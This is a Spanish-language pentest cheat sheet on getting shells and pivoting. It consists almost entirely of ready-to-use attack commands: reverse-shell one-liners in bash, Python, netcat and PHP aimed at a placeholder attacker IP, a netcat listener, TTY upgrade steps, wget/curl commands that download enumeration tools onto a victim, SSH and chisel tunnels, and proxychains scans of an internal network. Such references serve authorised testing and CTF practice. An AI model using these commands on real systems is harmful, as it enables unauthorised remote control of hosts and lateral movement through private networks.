# Shells & Pivoting

## Reverse shells

```bash
# Bash
bash -c 'bash -i >& /dev/tcp/TU_IP/PORT 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# nc (según variante)
nc TU_IP PORT -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TU_IP PORT >/tmp/f

# PHP
php -r '$s=fsockopen("TU_IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```

Listener:

```bash
nc -lvnp PORT
# mejor, rlwrap para historial:
rlwrap nc -lvnp PORT
```

Generador de referencia: https://www.revshells.com/

## Upgrade a TTY completa

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, luego:
export TERM=xterm
stty rows 50 columns 200
```

## Transferencia de archivos al objetivo

```bash
# Servidor en atacante
python3 -m http.server 80
# En la víctima
wget http://TU_IP/linpeas.sh -O /tmp/linpeas.sh
curl http://TU_IP/pspy64 -o /tmp/pspy64
```

## Port forwarding / túneles (SSH)

```bash
# Local: exponer puerto interno de la víctima en tu máquina
ssh user@victima -L 8080:127.0.0.1:8080
#   → ahora http://127.0.0.1:8080 en tu host llega al 8080 interno

# Dynamic (SOCKS) para pivotar a toda una red interna
ssh user@victima -D 1080
#   usa proxychains con socks5 127.0.0.1 1080

# Remote: traer un puerto tuyo a la víctima
ssh user@victima -R 9001:127.0.0.1:9001
```

## Pivoting sin SSH

```bash
# chisel (atacante = server, víctima = client)
./chisel server -p 8000 --reverse            # atacante
./chisel client TU_IP:8000 R:socks           # víctima
# luego proxychains
```

## proxychains

```
# /etc/proxychains4.conf
socks5 127.0.0.1 1080
```
```bash
proxychains nmap -sT 172.16.0.0/24
proxychains ffuf -u http://172.16.0.5/FUZZ -w wl.txt
```
